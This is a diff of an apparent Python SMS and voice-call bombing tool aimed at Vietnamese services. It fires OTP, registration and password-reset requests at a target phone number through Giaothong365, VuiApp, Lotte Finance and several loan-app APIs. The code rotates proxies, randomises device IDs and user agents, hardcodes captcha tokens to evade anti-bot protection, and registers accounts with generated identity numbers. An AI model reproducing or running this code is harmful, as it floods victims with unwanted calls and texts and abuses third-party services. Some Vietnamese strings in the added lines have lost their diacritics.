+"0cAFcWeA6KvqgvwmqDjRDrsCw2Ed6J-bSM07WFSMgmS0VWuVIcB7UR1FIX7hjNGiFel8p8_Gtj9Aun3jWAS38JjdIv6lPKvDdSh4eL7pFo-Toj37kpDawfx9bjeAa8Q82EY85tjnMPEFYM-Zu0N4K-BHwlRrnVkJxgQujlIzdBkXBdmDLq3Czv86oFxOis_FQLlyH-PhEMpt8_e2d-sVffK0nWFSg_4ZFxFEJYjOVGvERKP3SjwhIuJWDr3Kd8-Qr9KgbDPmKt-HSA6xUk7WvXao8PU2dSFOrwnlWyRVVngbFdTfunbYZbv-_KIK0ki1apcf0UCpMAqQ5YmkGDw2a5tnGkqrgpeGx11a8oRF3hTidaVH4EKsjESb3vq3leBW67WHNj2WiX-Mclkaav344qVljy0qKNTQiGASRMD88IcRITzAsnw2LTnpnPsOHmpRn3DvSyiwAX5t_J6AZ4_7veiIEMFIC3ySws7or82zavm_-K8xCFXpQCfDxQQaipd1m6wDF76N3P9q6qeBZGz757krPxwLtKB2-KR7OFMRCk650a3got1UinE0B_eSHuGVMyvS-SDkCFPNFebAgE1C9ABHyC1FhBaMM05mRt4pjrGqb_xKJSoseVOTZl_96aPBXlJa3iBFIO2DRU-2yWGUtDBS1gPCfEd5l2R_-tLdLuQOAYntCg7SOtHNHmdO_Y8HNiCee8FDnW23FQ3fPwNs-1B8Nr_FjGOL5XB7UdwLiEH325los83Rs-VWXTgZU7aKT10Ax9o_-gdyDhpOAM6T19TKwJdTLtBm5pSVhIggg8YBByfREWsDpWnZ5sLe_S8_8KU9Z8lFH_RyR1D1VU0GeZ39O6JfGaeXZcOm4O4g3sxmtR2odl1EOu7Ynp6gI5YD-arRP3olcZad74nuwGUnDDC6HCFseWymzsRfSCdTLuGiCUc0hItATVTO9tpc9vH1_VeAv_wxI5YgHgd9-FHxqYPFJkP0aHCzHD4ALXNVPgb9w5Jz7UVQAuAPGDgvZIYQAmN-HqX1GJoBPYMieuTtn-XC7LUKWEZz5oI5J8NvEgTOysxtZVo0XNKWt1KL9Ydi0pn_f3Tn4eR1DRRESYxFOAJdGXE2OTpWCU_Xugr1ZHnZMc1IGUKnlPFWmQ28hQUB6H4bYFrCAYdqvWHy4ZhSDwhjHGl8zcKzStq1qfPYIKmY-7BmSfvGsmsOB4aZJ2Ce_JmWFPLtjzW31m0sGuZEaMlG7XcmZnlIF-D0MXyxG1C_MFnPLC9QtORwgvQQZInHluaYpqEMSt6MJinVpCRBH_kIvAlyh7QZcNRClLmWFYxyeaYhB9c3jVJK7R2ZQOqLRGVs-3tyVKT6tGe2YXs9JbXvbYdEG1hChOre5CFvmplDUOzDoH3jUwOZhbM0Kfw6UO2yfonNXymQmL2I9Yrg484dcum-UQPHtH2_QJvSlXYjJ2prYNTAeTMpSKONjXTSQN80kDhmWu2H0q0KtpSeivdfzHTaeG3vUqBQuYF3SP4_l2QTYolTFebNbMv3I8y4b6DCYKWANxLeOku0ZOdbGO8_GTnWzGva1B3vcNiUa5x6xEnxMil1RFhZGtcP-0OzljNP0FZjELso5NVP0arjgHiEH7r_GtyYjDiFyqU_L0so0gCEHSB-WMoPHqXJN7lLXoOYnA7QWm6p05Cmios5tiFxCOmZlkCgI4oz3WxVXWMCFS0sJH-IilLsHAGUzZzQaH6HeQn-hIUclaNwYG3HejWRnlNFoTB0eSZpuxZUz34XWnwDkti_P3uqUFt1lV0eZcqL5OYQY872lXPfgKuHY_Yg-XpX6AxuWlVuzznghnPB_RVGwuZjLBpszgjy0LX7g25agHNrvcbZ3HHCush2HZHgZQbycnIVHAx5uZfz5QvDiD63DfesPQmk-2eVfLBFm8jcetgzgsJiGe1u3W38fgLIjR4YSuSNyJPnpJOcZoXExuo2VXSyWOlYknqeo0oe1zZo2tBtb9sC1OCug8yjUwhWr9QfdBkvmIvfRS_H4IhPLx8dlqrpCkDMnLsg_T6sCV3TS2raNgqLe3zhcXs16rUFGuFcv7B14BaW3SNbTP8qpzfW0rT1c94S3g1jyfJLUvIs2XS_iyuKtvHEJp6dfDoZQ5xKeUABV0-DVz-f6OiKydluijqfwDcOTOudjhrPOVzGzrvZsqihlXzPQFXPNIoLwUgkL7K4gF8I3saZB6FEpZO4GJowHcjZ71Ju1ObZnvX12JUnG9J2ycNwnAmRxk_Em9bcLOyX7HA_lHopUT7CzVoeXo8FozyibJ1uYwnaF2cVdx-iPPbgTzAjDSwpfhLSTtzYkIv_39o110weebbIOAH9sNug3Wv3NFnoBB6Pqr6aEwgOQU8dpVN5Jiv6S9RSKqOb_Ew0Z61fc9JQS1tWTzyOdgI4VALQWkrGY8sr_LGjVIvfzSH5ch8D0s_S4c-XSS9SazvJ6dFvQ7dee_BKDWFoVxpoS8W9RGwDPLWI3fmskwlYVKBvPAhIFvSd0xua9kNJ2XySTBmNfqEYRiuX0nroNtwt9mBgwmLdw0vczWaTO0yyHCAbDzLAYTE147rhZJF-su0gkOzSHfNEsKm64mRlJ7R-wz8xGBwWLZSXyJohXbw1DPVwJkyzp8OQK1KjVuEFnA2TtQIfZTAqEjB38z1Sb88mTCc874mhiLY8sEVrP3nJCxd7cmTRwjO9dg6u-biaPsi1gNgyPpGRJ1yoJYS9zSBvzdEzjHrdrO-PkaX7LTa2tX33qt"
 )
 
 _GT365_CAPTCHA_FORGOT = (
-    "0cAFcWeA6PyOWMfahX_TCH8DNAitRIiEEElFjBSAg-SFDD6eyztRm9q0nvtL-2eJTXXsXPSX-hlUBVvs_qNgnzBFJiS8ujc4L3KkhnhHNQ"
-    "bFSel-X9ktIgHpiRS7JVwtB6wW5uVaYRrXVxmFGwox9tbCtVVoyIVgRKjGtpZaWcmPF1hgRYcGx31PrO_JsHeLHqzBo8MactK3UjflxAy"
-    "PhCtkVCMwoJyx5DGv3w9hjzLa8NV1OIrD7ux2vPFcZ8vhcL-sKqkY9gmgF5rKsyJZxXC939B4ezVfYpInEkV64SI7eJHhxmQ0HpoBuGu5"
-    "a9M1R8UAvjj38Y09weIn_TPyZ-RgDE80CUKDvazvskLP4kfJ-knHyQNsuspLf2umu-Xoohz2IhSMC9EUTeBTv_lgWqCEbGgpxplGUpKMNm"
-    "7vCEtQw744CDgVubJ4Cmq9ACWFDFO4lIihCTxmMzwIBc4xTxIPdu1I32KAN74yXZ14gAFyvea_kA0b7gWNh3VvGlhg3ZVpMbNzQqeplnTI"
-    "lrt5CVa6m0wj4hG4xINfPKDRFeBYIipyHFk-I1Oq4ckAbt_Mr1WjmW2aaurTPR020LwKjyD2J_ZR45YOwX1Q7H7H9eAmRdyq8pucDWu0P"
-    "ianMpcHPVAfcXcxJJiF0YtBZ3WXfSp4Yr9S7PLhiXNasAS_NDj4lGQ0XXKxzq5K3sJyQr9SGyodwRGnBw63f4uYvz0GhNvB4-hFAcNDvi"
-    "jV5O0QpMxfmhdyzw9nzD4RfkLtgoXukANAwX5cFjoCSyZV10-TcFOcimavQyz4YXD47MiagDqnpcUSpSWvqv4RUbJVm4H_AFTtU46IcoaN"
-    "3hUqNiyotHk5ZbM_PsMIUWCiUkiPrnz1QLKMQ1QvJXjQHEOBU4Lylc3RQqMbRMG8KLpsaEjBbzVroYticfhW-41jQzgMsJbmfs7MUj7VR"
-    "G2WL3k7YoT-fR1ttvhuDCKO2UNCaLcKZNI9UJSDQqndaniLeSReiREIToL0BckvOay3vV8JdeZ7wklQuwPDGxAtbZ6fZwz8zCud8yh0bL6"
-    "n_5AdWmoWHN-ye5CnSfFAU3QJ7CjwxEtJ91H_cg--N4EoF-PXdsIKOhJHAgjgiT_rwId8YGQJ22pSwSwB_zkGEqeZI2TBuyTf8aQY4euO"
-    "jY-E1QpP4JQ82Mra7X4ClUYmAd_7n7KYXq3SUPvhScROoGtYAWeJiFwlxL8z5OfQlqtMgqsjgJK8N14SCNPaTJ9Ihep2sP1rQ0CPxVdqW"
-    "px-9Gtgq1WgApzZfuhjJp3U6EmOtAnqloptAkEhGAV_2gzVkA4eIXil5uBr_l7VEZTnUBVDoAeUo0IpXnARsgD7RuL86s1ZCEJvaE3kI1"
-    "vYzIG-atF9iRzmYoFQd7jk4jZ7NZ-qDvEliSbm2cjwUPQpKTQcY_P5BV6krGQlDVl9wGq0w56KdZV8HH2Q4-EzwotdrjEMUmVJdzCcVDR"
-    "1DxSSUJPgJD8m0OcDdkv3gum3PFkyj0AsPt7WLMZEHZy2J2krkvWa2-w8mj1bgoTwZ4_KbmcHMS-LcwjvSjv0044zo_aistTH1tsT5ygp"
-    "N5iKf7_4fhk9-RXmUVyFWkqJLamDjFBW7QENDkuoJ_B4ePuz2ZSyOIf_9iLeLtiWXiSOZ8JpfAm5JC0SfA_hVh3TjqdbJw5VsnXTSXq0"
-    "wDgYBr0oJhAjc_9zag-71RWkyfEERdiDyaYhtX623dATTW6U1aQ0N2jvDWf0GavJS7sshWxrZU1FWWZGxCd2ZOvxbG7uC53_f1sATk4fR"
-    "XHSD2gHVAdp6ZEn7-oIJMvsRt7GOWMNJEPSeU3EARM2MCmIo4GAhOuEyE1UKO6UKVjwmZnSPOCUd1icnzViPo1ShfLlPg7r1IBRT9bcwQ"
-    "1cfGFl-giNKCbK1jiId0_yD8KMfPIp2EyiQGTBcuf7qmmv3kM7_bR31uWG-0dA1-gZRuApjWDbjjqDLJ1KcX5BMpxeNho8t1fhFPPemS2"
-    "_AdJSF06pLkYSnLG4ck2zw57XuLTIvREB3OtUBEovyNlSkPhwlFcc3oJwZcWwK4KlirSYJ-wYwZksiKYuErvpuEYqmfv1MZkkWNJBIN1s"
-    "33ePAH_-LxTnFhLWiGhLQkr1l2BWABNIWRmUZeTU__WDshl_EeAWglfJQ0p_nVl8SuSmOn6UOmhZaHWhCGSh9Lnlx7gYlG2zHEREzJqUm"
-    "08UbQr8ffE3Gd-bl45dvUpq0TKxjxXA1-D0NYqOsjZ9b-vzmBTd-J7eq3oA58m9aCHXmKzuls_A9tWL49qKY6Yjf_O-sImItPUQ1Jo_J0"
-    "5EQr4IOpWDjqoGVRpjK5U2fXS0xDi46WZzpJ8_gQX5rcLawJNlB-_Hr7MZYvZTVM1hBpIh7LNvvCL63b9YX2gf0goL9ao1yZyP4QOoBwH"
-    "deNxIBFFRG7rrU0gwnOFMY0cryq-vHmYuvaCMS0j5vLKRcoMoLQzqD24EWJ1XKD_gDGaIjnL3dJJbemWLytx3wALBwHBuubBhJSvseJr7"
-    "a4HHGTUwnwlDNOFWmnpukL7_uM8FvcEv3AekB-iQZj_RrqU5QiQVjUdgc0GGs88Hl-DYG9IIqrooK6hVYtHIFG4K_7JiMX0EnvijNn94H"
-    "sd_0N1rgwCl6CMUBwPCjUXDLCrOQkzjoNuSAeOEQMj4fUS4KwNtlf4vfPbjgEadnCVu8adXxZ16pDIHK8WA1MOym2pEq8zEZwX3rhMX6y"
-    "hnObyzctSxzRccUjFF6J9S2Qk9AqX_iPZsbmMWFXYm9JPN8eYiWRmw"
+"0cAFcWeA7HbgNWL64pt7uCafmYIBYdc9NZkWHktC8sXddTqJpvYw82yjpEwUjPuXHrYCigLU6KS-KiAPYxDdU36TEwP984_gOFk7RaWhHS6PS_ca_y83sumrvIyIDhAoD64Oh-QgtSmHHSjPNxoNE5-6N5zC-ewNlxn-qPoykxywCQEsthymZNfOwC16knHp16XxZP3sAREhl9r0oF50MG4vn6-U6AxE_49qE3wISYBP6MyaiJurYfrV9ZT8PowP34CdjPD79vfjGBVyfcOQAqwp7yVgHabyW-ldNdMafSn-QHC-7DXI7rOoD7V4GWhhVEnK197Ztk2GsYEbPcbyT6csA7oHmY3gdi13luYLWMgRnOeGmOuuxNpI73R5UOJreXc0MWqpekXa_gkUIbyV_6vNgKPo4Cp-6JHdEyg1d3hWF8iBbfWUXoiOmMrqdc8NVCnk1OOu6gYo6fLrAgD3QHow518nUuq6Vq1oxhIi9aJFvaDqju3zG2wILoYZ5iCI5D4sRg9iBfMF2WGLaXywuaT5zhFwkCSMITLflrK-ASIBhiyJsgV4oNWaoUFwX2i0BWhAl5UARfcIzY3Bg4B7i4cHbex689wPcXiI1do3ftqBx3jV9axq-8FGVm0lNkVa3YAAy4BTg5p2Nk-eR5LwPqBkLiwKk29t36nlo9_kyzueGexWQeK0oatsek-wxNbZbiVA1KMqUbJ2HwM7nyVxwGwv8FcXvEizsT0dI3cTKOoTUk66kcnbQ5L9TB_-xJMqmRRALrGzLTumMFjtlFyw5ZSP8ZSaxPAGgcrMpkW-Css3rTcQ0E3BaqB-HBYp6hwTIcQ-Vxb7GrTC3oo9tBPtTzco9vwV5YYm2famtq1A9Y6gKB95nyvAt-7Sugpk8igw1qdwwJ20Sz3F_B6JhojtAGH9JdUZNw_CL0g8gYmJwCHcCQvCDEF3yvezdb2_-D781AcOr8O_zSTzeXMfdpupFS99UZlRmxzSd9l9Cb0YUKbVS5ktbhsdkw6WsR0cZyDV_ZYfv9hDE7VCl-1LoT2rEBFRIoeBjosYNAT5Of71BW6Fbi2s9m3niNuW1DgVscdPulXPh988GjFo5CTwtsbvwL9d053_d2GMNH1CeN18Z-yQyqAW78RlyV3CCJB3V7oKjzmuRvF7z-pE81cyxRGSbw0qUfbF6vaj9axbgUGY6znvQOQFHP5j9zrTW22kHZv7ZNNOwFbqtX7NWLtBqFPw1uozAamB6EeyNbWm5oFiTkhJi9Q7FuhZubXA7IosFnxN_6qe5HqVUyAYyda5OtxGLRVuzNxk6Zzw5nc4u12jTwuL76XnFO70F8mFfk4wCPNwum3iDHIhPaK9tC4p6B39nHgfkCSLOdkFSGY55ZRcVkl1gFMt7ayh9fdDTKgg7McQK5-_eUoVPfxXIRKwMAcVQy0-OI3sdGTviLuNCZPdcWlLFVoroEluKnH3_af7h0LLNv2AjTAtlEXdNiJajxaXWK22MfBdY6Z4O_XTGRSPbdRW_dgU2lWnUsPiF-_SexNPJO7hLyBrYcKsHAuXbdNk26BM2HNY6Pkv-KVfVO54NjIVZAW1Bo-ylxDFiVPooM6R4lAUIDDyIDhcnMFqbDTcdEPaN6NeOL5UpXkAutPD08LL1b-ByhnY346E_8Z6e0J8ZeMsXQ3ZAHmvtzO2zN6oyRHbeQ4X0jnCK89pa4KBoEJUE_C_HikLXPmjh72KL-lYLqbIZ918mQGyGvz8vniYURTjf5UCkhm2x5CzSqwGMVagW8eXgCe1uYAcgh1F2RBCD_vj9QTo_DZKxA3RIn7PoNcaH_bErAZ7aQ-uW4VXKp12tlFBTRx5RObFCrE-BAG6V3HQybPDxuhcpfSrW0hxRt3unao1zu0bOXFBhQcvnwpDewm4RInrEmFIKR86i7M_rEvXF4pfimreHGaunJDJyxfQke0jiqm0_9wYZCYslJ9e7ysnAY3a0673jfZZw5k87WE33GTZsqVbh8WQuxbMU4OEkW3lKJQYipm0QwDkc2qTnzEH9f2vCd93rf1HvrDTEKiP3VTk-6QJz0Vhcsc_Hbh42AKof6kVdyQuStJfzL8BtrqzQ4o4k2AjsWwRjjVsXInWBFMT1GhGXa4hgje7HKfLdwmh8xnM-X4Fjvcjd1iDZRIa4KyzyiGmytWSLb8K97mFWZ7jQVTi2FTO92TKkmb2izn1vXoe2ismTKvJL5AXpi8FqzhM72w3ju37WcD4TcolWvEJYBjpLqbClIkLftsiSOVAQmD7r9Z01NlJRoF-mFCN0Y4P8ZpklCELq30KNWvn8uNobnkYezm1G_IWpgnHHjCIOmjtcdWwE1BbkwY1CpIDZOgacaYQyDTZ9iV1QzZrCFySWVE8EwLZx5ONVsZAVjeuBWPEvPscEQCZOFR4a3CbzRMQBQ6m64ZSYJkXMa2MQ2xr5J9PkgAA1sdlBDK-I7Pl4nl20lJRp2Qb2TmspwoN7f5A1RYh0IgsOGV-rvfHkYgijFTaHX4v-AT63tKPGTxnT6oiTklIHgnZfkdXfAfvXKMabnq79uz_3uVrv_JE8S0B9W6wme"
 )
 
 
@@ -2435,9 +2030,8 @@ def _gt365_headers(device_id):
 async def giaothong365_register(phone):
     phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
     device_id = str(uuid.uuid4()).upper()
-    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_REGISTER
     try:
-        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
+        async with _make_client(timeout=15, follow_redirects=True) as client:
             await client.get(
                 'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                 headers=_gt365_headers(device_id),
@@ -2445,22 +2039,21 @@ async def giaothong365_register(phone):
             resp = await client.put(
                 'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/register/request-otp',
                 headers=_gt365_headers(device_id),
-                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
+                json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_REGISTER},
             )
             data = resp.json().get('data', {})
             ok = resp.status_code in (200, 201) or data.get('errorCode') == 400001000
             print(f"GT365-Register | {'OK' if ok else 'X'} [{resp.status_code}]")
             return ok
-    except Exception as e:
-        print(f"GT365-Register | ~> Lỗi: {type(e).__name__}: {e}")
+    except Exception:
+        print("GT365-Register | ~> Li")
 
 
 async def giaothong365_forgot(phone):
     phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
     device_id = str(uuid.uuid4()).upper()
-    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_FORGOT
     try:
-        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
+        async with _make_client(timeout=15, follow_redirects=True) as client:
             await client.get(
                 'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                 headers=_gt365_headers(device_id),
@@ -2468,102 +2061,13 @@ async def giaothong365_forgot(phone):
             resp = await client.put(
                 'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/forgot-password/request-otp',
                 headers=_gt365_headers(device_id),
-                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
+                json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_FORGOT},
             )
             ok = resp.status_code in (200, 201)
             print(f"GT365-Forgot | {'OK' if ok else 'X'} [{resp.status_code}]")
             return ok
-    except Exception as e:
-        print(f"GT365-Forgot | ~> Lỗi: {type(e).__name__}: {e}")
-
-
-
-_VUIAPP_URL = "https://api-vncdn.vuiapp.vn/graphql"
-
-
-def generate_vuiapp_headers():
-    device_id = str(uuid.uuid4()).upper()
-    trace_id = uuid.uuid4().hex
-    span_id = uuid.uuid4().hex[:16]
-    cfnet, darwin = random.choice(_IOS_CFNETWORK)
-    return {
-        "Host": "api-vncdn.vuiapp.vn",
-        "Accept": "*/*",
-        "Accept-Language": "vi-VN",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Content-Type": "application/json",
-        "Connection": "keep-alive",
-        "User-Agent": f"RNClientApp/20260507113653 CFNetwork/{cfnet} Darwin/{darwin}",
-        "x-app-version": "4.39.70",
-        "x-platform": "ios",
-        "x-device-id": device_id,
-        "x-format-money": "json",
-        "x-debug-otp": "false",
-        "sentry-trace": f"{trace_id}-{span_id}",
-        "baggage": f"sentry-environment=production,sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,sentry-trace_id={trace_id},sentry-org_id=402372"
-    }
-
-async def Call_VuiApp0(phone):
-    headers = generate_vuiapp_headers()
-    payload = {
-        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
-        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone}},
-        "operationName": "resendAuthenticationOTP",
-    }
-    try:
-        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
-            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
-        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
-        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
-        print(f"[VuiApp0] {r.status_code} | {r.text[:120]}")
-        return ok
-    except Exception as e:
-        print(f"[VuiApp0] ERR {type(e).__name__}: {e}")
-        return False
-
-
-async def Call_VuiApp(phone):
-    headers = generate_vuiapp_headers()
-    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
-    payload = {
-        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      __typename\n    }\n    __typename\n  }\n}\n",
-        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone_fmt}},
-        "operationName": "resendAuthenticationOTP",
-    }
-    try:
-        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
-            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
-        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
-        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
-        print(f"[VuiApp] {r.status_code} | {r.text[:120]}")
-        return ok
-    except Exception as e:
-        print(f"[VuiApp] ERR {type(e).__name__}: {e}")
-        return False
-
-
-async def Call_VuiApp1(phone):
-    headers = generate_vuiapp_headers()
-    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
-    payload = {
-        "operationName": "requestChangePassword",
-        "variables": {"phoneNumber": phone_fmt, "otpLength": 6},
-        "query": (
-            "mutation requestChangePassword($phoneNumber: PhoneNumber!, $otpLength: Int) {\n"
-            "  requestChangePassword(phoneNumber: $phoneNumber, otpLength: $otpLength) {\n"
-            "    requestId\n    otp { success retryAfter __typename }\n    __typename\n  }\n}\n"
-        ),
-    }
-    try:
-        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
-            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
-        otp = (r.json().get("data") or {}).get("requestChangePassword") or {}
-        ok = bool((otp.get("otp") or {}).get("success"))
-        print(f"[VuiApp1] {r.status_code} | {r.text[:120]}")
-        return ok
-    except Exception as e:
-        print(f"[VuiApp1] ERR {type(e).__name__}: {e}")
-        return False
+    except Exception:
+        print("GT365-Forgot | ~> Li")
 
 
 def _vnadmin_sign(data: dict, secret: str) -> str:
@@ -2578,7 +2082,7 @@ async def _vnadmin_request(phone, appkey, origin, url, secret):
     data = {"mobilenumber": mob, "AppKey": appkey, "loading": True}
     data["sign"] = _vnadmin_sign(data, secret)
     try:
-        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=30) as client:
             r = await client.post(
                 url, json=data,
                 headers={
@@ -2631,8 +2135,9 @@ async def vaygo(phone):
     headers = {
         "Host": "api.vaygovn.com", "Accept": "*/*",
         "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": random.choice(_XMH_UA_POOL),
+        "Origin": "https://api.vaygovn.com",
         "Referer": "https://api.vaygovn.com/",
+        "User-Agent": random.choice(_XMH_UA_POOL),
         "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
     }
     data = {
@@ -2643,10 +2148,10 @@ async def vaygo(phone):
     try:
         async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
             response = await client.post(url, headers=headers, data=data)
-        print(f"📡 Status: {response.status_code}")
+        print(f" Status: {response.status_code}")
         return response.status_code == 200
     except Exception as e:
-        print(f"❌ Unexpected Error: {e}")
+        print(f" Unexpected Error: {e}")
         return False
 
 
@@ -2656,8 +2161,9 @@ async def anvay(phone):
     headers = {
         "Host": "vnapi.anvay.asia", "Accept": "*/*",
         "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": random.choice(_XMH_UA_POOL),
+        "Origin": "https://vnapi.anvay.asia",
         "Referer": "https://vnapi.anvay.asia/",
+        "User-Agent": random.choice(_XMH_UA_POOL),
         "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
     }
     data = {
@@ -2668,10 +2174,10 @@ async def anvay(phone):
     try:
         async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
             response = await client.post(url, headers=headers, data=data)
-        print(f"📡 Status: {response.status_code}")
+        print(f" Status: {response.status_code}")
         return response.status_code == 200
     except Exception as e:
-        print(f"❌")
+        print(f"")
         return False
 
 
@@ -2694,7 +2200,7 @@ async def vaysuoi(phone):
     try:
         async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
             response = await client.post(url, headers=headers, data=data)
-        print(f"📡 Status: {response.status_code}")
+        print(f" Status: {response.status_code}")
         return response.status_code == 200
     except Exception as e:
         print(f"{e}")
@@ -2720,7 +2226,7 @@ async def hicash(phone):
     try:
         async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
             response = await client.post(url, headers=headers, data=data)
-        print(f"📡 Status: {response.status_code}")
+        print(f" Status: {response.status_code}")
         return response.status_code == 200
     except Exception as e:
         print(f"{e}")
@@ -2744,7 +2250,7 @@ async def vayxanh(phone):
     }
     cookies = {}
     try:
-        async with httpx.AsyncClient(verify=False, timeout=30, proxy=_current_proxy()) as cl:
+        async with httpx.AsyncClient(timeout=30, proxy=_current_proxy()) as cl:
             resp_get = await cl.get(
                 "https://lk.vayxanh.com/",
                 params={
@@ -2760,12 +2266,7 @@ async def vayxanh(phone):
                 cookies=cookies, headers=headers_post,
                 json={"data": {"phone": phone, "code": "resend", "channel": "ivr"}},
             )
-        ok = r.status_code == 200
-        if ok:
-            print(f"[VayXanh] ✅ OK")
-        else:
-            print(f"[VayXanh] ❌ HTTP {r.status_code}: {r.text[:100]}")
-        return ok
+        return r.status_code == 200
     except Exception as e:
         print(f"[VayXanh] ERR {type(e).__name__}: {e}")
         return False
@@ -2781,52 +2282,576 @@ async def lotte(phone):
         f"{random.randint(0, 99):02d}"
     )
     headers = {
+        'Host': 'digital.lottefinance.vn/vi',
         'Accept': 'application/json, text/plain, */*',
         'Content-Type': 'application/json',
         'User-Agent': random.choice(_XMH_UA_POOL),
         'Accept-Language': 'vi-VN,vi;q=0.9',
         'Accept-Encoding': 'gzip, deflate, br',
     }
-    json_data = {
-        'login': identity, 'phoneNumber': phone,
-        'identityNumber': identity, 'changeRequired': True,
-        'email': generate_email(),
-    }
     try:
         async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
-            r = await client.post(
+            # Step 1: register account
+            r1 = await client.post(
                 'https://digital.lottefinance.vn/lfd-api/api/account/register',
-                headers=headers, json=json_data,
+                headers=headers,
+                json={
+                    'login': identity, 'phoneNumber': phone,
+                    'identityNumber': identity, 'changeRequired': True,
+                    'email': 'cotenhp29999@gmail.com',
+                },
             )
-        print(f"LOTTEFINANCE | -> OK [{r.status_code}]")
-        return r.status_code == 200
-    except Exception:
-        print("LOTTEFINANCE | ~> Lỗi")
+            d1 = r1.json()
+            if d1.get('code') != 'SUCCESS':
+                print(f"LOTTEFINANCE | register -> {d1.get('code')} {d1.get('msg', '')}")
+                return False
+            # Step 2: generate OTP -> SMS to phone
+            r2 = await client.post(
+                'https://digital.lottefinance.vn/lfd-api/api/auth/otp/generate',
+                headers=headers,
+                json={'phoneNumber': phone, 'identityNumber': identity},
+            )
+            d2 = r2.json()
+            ok = d2.get('code') == 'OTP.00'
+            print(f"LOTTEFINANCE | OTP [{r2.status_code}] code={d2.get('code')} authSeq={d2.get('authSeq')}")
+            return ok
+    except Exception as e:
+        print(f"LOTTEFINANCE | ERR {type(e).__name__}: {e}")
         return False
 
 
-_FINVAY_HEADERS = {
-    "Content-Type": "application/json",
-    "Accept": "application/json",
-    "Accept-Charset": "UTF-8",
-    "Accept-Language": "vi-VN,vi;q=0.9",
-    "User-Agent": "ktor-client",
+#  Smart-Loan group: F668 / VayDay / VayFast 
+_SMARTLOAN_UA = (
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
+    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
+)
+
+
+async def _smartloan_otp(phone: str, base: str, channel: str) -> bool:
+    """GET /smart-loan/app/validation/code  dng chung cho F668/VayDay/VayFast."""
+    try:
+        async with _make_client(timeout=20) as client:
+            r = await client.get(
+                f"{base}/smart-loan/app/validation/code",
+                params={"phone": phone, "type": "MODIFY_PASSWORD", "sendChannel": "IVR"},
+                headers={
+                    "Accept": "application/json, text/plain, */*",
+                    "User-Agent": _SMARTLOAN_UA,
+                    "source": "H5",
+                    "inputChannel": channel,
+                    "versionId": "20230627",
+                },
+            )
+        data = r.json()
+        return data.get("status", {}).get("code") == "000"
+    except Exception as e:
+        print(f"[{channel}] ERR {type(e).__name__}: {e}")
+        return False
+
+
+async def Call_F668(phone: str) -> bool:
+    return await _smartloan_otp(phone, "https://f668.vn", "F668")
+
+
+async def Call_VayDay(phone: str) -> bool:
+    return await _smartloan_otp(phone, "https://vayday.vn", "VAYDAY")
+
+
+async def Call_VayFast(phone: str) -> bool:
+    return await _smartloan_otp(phone, "https://vayfast.com.vn", "VAYFAST")
+
+
+def _load_turnstile_token(app_id: str) -> str:
+    import pathlib as _pl
+    p = _pl.Path(__file__).parent / "tokens.json"
+    if not p.exists():
+        print(f"[tokens.json]  Khng tm thy {p}  chy grab-jwt trc")
+        return ""
+    try:
+        data = json.loads(p.read_text(encoding="utf-8"))
+        for app in data.get("apps", []):
+            if app.get("id") == app_id:
+                tok = app.get("turnstileToken") or ""
+                if not tok:
+                    print(f"[tokens.json]   [{app_id}] turnstileToken chy grab-jwt trc")
+                return tok
+        print(f"[tokens.json]   Khng tm thy app_id='{app_id}' trong {p}")
+        return ""
+    except Exception as e:
+        print(f"[tokens.json]  Li c {p}: {e}")
+        return ""
+
+
+
+#  LuckyLoan (AES-ECB) 
+_LL_KEY = b"0776640cb64849c8b8dea379551cb922"
+
+
